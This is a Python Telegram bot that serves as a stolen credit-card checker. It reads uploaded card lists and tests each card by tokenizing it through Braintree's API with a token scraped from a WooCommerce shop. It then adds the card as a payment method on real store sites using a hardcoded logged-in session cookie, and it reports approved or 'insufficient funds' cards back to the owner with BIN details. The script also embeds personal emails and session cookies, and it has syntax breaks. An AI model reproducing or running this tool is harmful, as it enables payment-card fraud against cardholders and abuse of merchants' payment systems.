import requests,user_agent,json,flask,telebot,random,os,sys,re
import telebot,string,base64,json
import time
from bs4 import BeautifulSoup
from telebot import types
from user_agent import generate_user_agent
from re import findall
from flask import Flask, request
import requests
import urllib3
from datetime import datetime
import base64
import uuid
import secrets

correlationid = secrets.token_hex(16)

def  binn(bin,c,msg):
	binn = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
	if 'Invalid BIN' in binn.text or 'not found.' in binn.text or 'Error code 521' in binn.text or 'cloudflare' in binn.text:
		binnn = 'None'
		brand = 'None'
		country = 'None'
		country_name = 'None'
		country_flag = 'None'
		country_currencies = 'None'
		bank = 'None'
		level = 'None'
		type = 'None'
	else:
		js = binn. json()
		binnn = js['bin']
		brand = js['brand']
		country = js['country']
		country_name = js['country_name']
		country_flag = js['country_flag']
		country_currencies = js['country_currencies'][0]
		bank = js['bank']
		level = js['level']
		type = js['type']
		return f"""*ア 𝘾𝘾 -» <code>{c}</code>
カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» <strong>Online</strong> ✅
零 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {msg}
カ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» Stripe Charge
キ 𝘽𝙞𝙣 -» <code>{type} - {brand} - {level}</code>
朱 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>

ᥫ᭡ 𝙗𝙤𝙩 @M77SaLah"""

bot = telebot.TeleBot("")#token
idteleg=#id

def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None
a = True

@bot.message_handler(commands=['start'])
def start(message):
    ig=message.from_user.id
    if idteleg == ig:
        idd = message.from_user.id
        first = message.from_user.first_name
        bot.reply_to(message,f"Hello Pro Bot\nPlease Send Cc List",parse_mode="markdown")
        
@bot.message_handler(commands=['stop'])
def stop(message):
    global a
    ig=message.from_user.id
    if idteleg == ig:
        a=False
        idd = message.from_user.id
        first = message.from_user.first_name
        bot.reply_to(message,f"Stoped",parse_mode="markdown")
              




@bot.message_handler(content_types=['document'])
def send_file(message):
	ig=message.from_user.id
	if idteleg == ig:
		pass
	else:
		bot.reply_to(message,"Sorry Please Subscribe From.@M77SaLah",parse_mode="markdown")
		return
	global a
	session = requests.Session()
	bad=0
	ccn=0
	cvv=0
	app=0
	nc=0
	try:
		file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open(f"{message.document.file_name}", 'wb') as f:
			f.write(file_input)
	except:
		bot.reply_to(message, text='Error Cc List')
	key = types.InlineKeyboardMarkup(row_width=1)
	af = types.InlineKeyboardButton('OWNAR', url='https://t.me/M77SaLah)
	key.add(af)
	cou = len(open(f"{message.document.file_name}","r").read().splitlines())
	idmss=bot.reply_to(message, text=f'Done Read Files Count: {cou}',reply_markup=key)
	cok1="sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-31%2001%3A02%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Ffabulousferret.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffabulousferret.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-05-31%2001%3A02%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Ffabulousferret.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffabulousferret.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; woolentor_already_views_count_product=a%3A1%3A%7Bi%3A1748653328%3Bi%3A238%3B%7D; tk_ai=PAVqwCZQwv21UrKzUATyQUxz; woocommerce_items_in_cart=1; woolentor_viewed_products_list=a%3A1%3A%7Bi%3A1748653336%3Bi%3A238%3B%7D; mailchimp.cart.previous_email=mosalahxqww828@gmail.com; mailchimp.cart.current_email=mosahlahxqww828@gmail.com; mailchimp_user_previous_email=mosahlahxqww828%40gmail.com; mailchimp_user_email=mosahlahxqww828%40gmail.com; wordpress_logged_in_9877621c3986f84aed1814d9b4e680cb=jones.ali%7C1749863028%7CEytfOg4ogs09jlHp1PFyXIJoyPTgBFm1pSbkUbR6BYy%7Cdc3d4acbf0ff3632d18518612f2c84c705bc5dbaab844180135b2d2434e74d58; tk_ai=jetpack%3AhIeAFaOkJTHmgufTihysCmK%2B; woocommerce_cart_hash=5d246b1ae4879116540b485e006d9cba; wp_woocommerce_session_9877621c3986f84aed1814d9b4e680cb=287%7C%7C1748826136%7C%7C1748822536%7C%7C5b675d5569959ddf54a4167e2bc147c0; mailchimp_landing_site=https%3A%2F%2Ffabulousferret.com%2Fcheckout%2F; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffabulousferret.com%2Fcheckout%2F; tk_qs="
	cok=cok1
	
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
    'dnt': '1',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'cookie': cok,
}
	
	r = requests.get('https://fabulousferret.com/my-account/add-payment-method/', headers=headers)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',r.text)[0]
	aut=r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	a = True
	for g in open(f"{message.document.file_name}","r").read().splitlines():
		if not a:
			break
		nc+=1
		c = g.strip().split('\n')[0]
		cc = c.split('|')[0]
		exp=c.split('|')[1]
		ex=c.split('|')[2]
		try:
			exy=ex[2]+ex[3]
			if '2' in ex[3] or '1' in ex[3]:
				exy=ex[2]+'7'
			else:pass
		except:
			exy=ex[0]+ex[1]
			if '2' in ex[1] or '1' in ex[1]:
				exy=ex[0]+'7'
			else:pass
		cvc=c.split('|')[3]
		url = "https://payments.braintree-api.com/graphql"
		payload = json.dumps({
		  "clientSdkMetadata": {
		    "source": "client",
		    "integration": "custom",
		    "sessionId":" 7d558ddf-3893-44b6-9ffc-92fb3bdb38bb",
		  },
		  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
		  "variables": {
		    "input": {
		      "creditCard": {
		        "number": cc,
		        "expirationMonth": exp,
		        "expirationYear": "20"+exy,
		        "cvv": cvc,
		        "billingAddress": {
		          "postalCode": "10080",
		          "streetAddress": "ghfgh"
		        }
		      },
		      "options": {
		        "validate": False
		      }
		    }
		  },
		  "operationName": "TokenizeCreditCard"
		})
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'sec-ch-ua-mobile': "?1",
		  'authorization': f"Bearer {auth}",
		  'braintree-version': "2018-05-10",
		  'save-data': "on",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://assets.braintreegateway.com",
		  'sec-fetch-site': "cross-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://assets.braintreegateway.com/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
		}
		response = requests.post(url, data=payload, headers=headers)
		tokencc =(response.json()["data"]["tokenizeCreditCard"]["token"])
		url = "https://payments.braintree-api.com/graphql"
		payload = json.dumps({
		  "clientSdkMetadata": {
		    "source": "client",
		    "integration": "custom",
		    "sessionId": "01db6493-467c-448d-b6ab-99789c040e26"
		  },
		  "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
		  "operationName": "ClientConfiguration"
		})
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'sec-ch-ua-mobile': "?1",
		  'authorization': f"Bearer {auth}",
		  'braintree-version': "2018-05-10",
		  'save-data': "on",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://baitfinesseempire.com",
		  'sec-fetch-site': "cross-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://baitfinesseempire.com/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
		}
		
		response = requests.post(url, data=payload, headers=headers)
		braintreeClientId=(response.text.split('"braintreeClientId":')[1].split('"')[1])
		clientId=(response.text.split('"clientId":')[1].split('"')[1])
		merchants=(response.text.split('"merchantId":')[1].split('"')[1])
		url = "https://baitfinesseempire.com/my-account/add-payment-method/"
		data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tokencc,
    'braintree_cc_device_data': '{"device_session_id":"13cd0795f78beddd3cccf89716e634a1","fraud_merchant_id":null,"correlation_id":"'+correlationid+'"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/'+merchants+'/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/'+merchants+'"},"merchantId":"'+merchants+'","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Piggy BedSpreads LLC","clientId":"AaVzXvcLzosD7zlezgrJv8O-m2S-gdvm43QOj_rFLhr4Vt-SYXIguX8EwlZYrAYZL4e_227A64FfPrFw","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"'+braintreeClientId+'","billingAgreementsEnabled":true,"merchantAccountId":"piggybedspreadsllc_instant_2","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
		headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://fabulousferret.com',
    'priority': 'u=0, i',
    'referer': 'https://fabulousferret.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'cookie': cok1,
}
		
		response = requests.post('https://fabulousferret.com/my-account/add-payment-method/', headers=headers, data=data).content
		response=str(response)
		start_index = response.find("There was an error saving your payment method. Reason: ") + len("There was an error saving your payment method. Reason: ")
		end_index = response.find('<', start_index)
		msg = response[start_index:end_index].strip()
		print (msg)
		try:
			msg= msg
		except:
			msg=msg
		if msg == None:
		  	msg=("Approved ✅")
		  	app+=1
		  	try:
		  		mjj=binn(cc,c,msg)
		  	except:mjj='None'
		  	bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		elif 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg or "Invalid postal code or street address" in msg or "ite no-js" in msg or "n-US" in msg:
		  	msg=("Approved ✅")
		  	app+=1
		  	try:
		  		mjj=binn(cc,c,msg)
		  	except:mjj='None'
		  	bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		elif 'Card Issuer Declined CVV' in msg or "postal code cvv" in msg:
		  	msg=("Declined CVV ❎")
		  	ccn+=1
		  	try:
		  		mjj=binn(cc,c,msg)
		  	except:mjj="None"
		  	bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		elif 'Insufficient Funds' in msg:
		  	cvv+=1
		  	msg=("Insufficient Funds. ✅")
		  	try:
		  		mjj=binn(cc,c,msg)
		  	except:mjj='None'
		  	bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		else:
			bad+=1
		
		key = types.InlineKeyboardMarkup(row_width=1)
		ccli = types.InlineKeyboardButton(f" {g} ☢", callback_data="cclist")
		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❎", callback_data="cvv")
		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❎", callback_data="cvv")
		ap = types.InlineKeyboardButton(f" approved : {app} ✅", callback_data="aproved")
		badd = types.InlineKeyboardButton(f" stauts : {msg} ❕", callback_data="baad")
		nch = types.InlineKeyboardButton(f" num chk : {nc} 💱", callback_data="chk")
		own = types.InlineKeyboardButton(f"OWNAR", url="https://t.me/hossam7bot")
		key.add(ccli,badd,nch,ap,ccnn, cvvv,own )
		bot.edit_message_text(chat_id=message.chat.id, message_id=idmss.message_id,text="Checker Run ✔", reply_markup=key)
		time.sleep(30)
		


                        
bot.polling()
